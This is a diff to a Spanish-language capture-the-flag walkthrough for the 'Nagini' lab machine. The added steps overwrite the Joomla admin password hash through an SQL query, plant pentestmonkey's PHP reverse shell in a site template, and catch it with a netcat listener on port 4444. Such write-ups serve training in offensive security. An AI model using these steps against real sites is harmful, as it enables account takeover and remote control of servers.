@@ -114,7 +114,7 @@ Entramos en la página web que hemos recopilado anteriormente y probando hemos c
 
 Además también recopilamos que podria haber un archivo .bak, así que como sabemos que joomla tiene un **configuration.php** probaremos ese archivo pero con el **.bak**
 
-En este archivo hemos encontrado que un usuario es **goblin**
+En este archivo hemos encontrado que un usuario es **goblin** y el correo **site_admin@nagini.hogwarts**
 
 ## Explotación de vulnerabilidades
 
@@ -166,8 +166,25 @@ Este payload lo meteremos en la web ```http://quic.nagini.hogwarts/internalResou
 	Give query to execute: use joomla; select * from joomla_users;
 ```
 
+Lo que vamos hacer ahora es modificar la contraseña del usuario con el correo que encontramos anteriormente
+
 ```
 	Give MySQL username: goblin
 	Give query to execute: use joomla; update joomla_users set password='5f4dcc3b5aa765d61d8327deb882cf99' where email = 		'site_admin@nagini.hogwarts';
 ```
+
+> Esa contraseña es **password** en md5
+
 <img src="https://i.gyazo.com/56244fae80fb8c16a813a99b97a8b866.png">
+
+> Se veria de esta forma el uso de esta tool
+
+### Joomla
+
+Iremos a esta dirección para modificar un index.php como una [reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php):
+
+**Extension --> Templates -->  Templates (Site) --> Customise (Protostar)**
+
+Ahora explotaremos la vulnerabilidad poniendo un puerto abierto ```rlwrap nc -nvlp 4444``` y abriendo la reverse shell desde esta url:
+```http://192.168.221.8/joomla/templates/protostar/index.php```
+
